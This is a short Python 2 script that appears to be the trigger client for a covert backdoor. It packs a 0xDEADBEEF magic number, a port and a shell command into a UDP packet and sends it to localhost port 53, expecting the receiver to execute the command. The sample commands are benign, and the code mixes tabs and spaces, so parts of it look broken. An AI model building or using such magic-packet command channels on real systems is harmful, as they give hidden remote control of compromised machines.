import socket
from ctypes import *

#packet struct
CharArr256 = c_char * 256
class Packet_t(Structure):
    _fields_ = [('magic', c_uint32),
                ('port', c_uint16),
                ('command_shell', CharArr256)]

    def __init__(self, n, p,cmd):
        self.magic = n
        self.port = p
	str= create_string_buffer(cmd,256)	# create a 256 byte buffer, initialized to NUL bytes
	self.command_shell = cmd

#construct socket
UDP_IP = "127.0.0.1"
UDP_PORT = 53
sock = socket.socket(socket.AF_INET, # Internet
                      socket.SOCK_DGRAM) # UDP

#construct packet
MAGIC_NUM = int("0xDEADBEEF", 16)
PORT1 = 5566
COMMAND1 = "echo Hello World!!"
COMMAND2 = "touch /test/b.text"

#send
p1 = Packet_t(MAGIC_NUM,PORT1,COMMAND1) #SHOULD EXEC COMMAND AND ADD PORT
sock.sendto(p1, (UDP_IP, UDP_PORT))

print "PACKET sent!"
